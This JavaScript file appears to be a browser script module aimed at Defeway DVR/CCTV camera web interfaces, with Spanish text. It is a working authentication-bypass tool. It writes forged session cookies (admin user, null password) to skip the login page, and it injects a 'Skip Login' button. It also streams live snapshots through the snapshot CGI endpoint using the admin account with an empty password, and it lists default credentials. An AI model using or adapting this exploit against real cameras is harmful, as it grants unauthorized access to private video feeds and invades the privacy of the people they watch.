class cctv{
	static load(){
		cctv.load_menu()
		if(location.pathname==="/")
			cctv.login()
		else if(location.pathname==="/view2.html")
			cctv.view()
	}

	static load_menu(){
		CCTV.load_menu("Defeway",["admin@[empty]"])
		document.querySelector("#cctv_vuln").innerHTML+="<p><a href='javascript:cctv.autologin()'>Vulnerabilidad</a>: No valida el usuario, por lo que puedes saltarte identificación creando las cookies.</p>"
		document.querySelector("#cctv_vuln").innerHTML+="<p>Extremadamente inseguro: Versiones antiguas pueden contener backdoors (<a href='https://www.pentestpartners.com/security-blog/pwning-cctv-cameras/' target=_blank>link</a>).</p>"
	}

	static autologin(){
		document.cookie="lxc_save=admin%2C; dvr_camcnt=8; dvr_clientport=80; dvr_sensorcnt=4; dvr_usr=admin; dvr_pwd=null; iSetAble=1; iPlayBack=1"
		location="/view2.html"
	}


	/*	Pages	*/
	static login(){
		document.querySelector("#cctv_box>details:nth-child(3)").innerHTML+="<button onClick='cctv.autologin()'>Skip Login</button>"
	}

	static view(){
		cctv.img=document.createElement("img")
		document.getElementById("flashcontent-container").innerHTML=""
		document.getElementById("flashcontent-container").append(cctv.img)
		chn_container.querySelectorAll("div>img,div>span").forEach((e,i)=>{e.onclick=()=>{cctv.stream_img(parseInt(i/2))}})
		chn_container.querySelector("div:nth-child(2)>span").click()
	}

	static stream_img(chn){
		cctv.img.onload=()=>cctv.img.src="/cgi-bin/snapshot.cgi?chn="+chn+"&u=admin&p=&q=0&d=1&rand="+Math.random()
		cctv.img.onerror=cctv.img.onload
		cctv.img.onload()
	}
}
cctv.load()
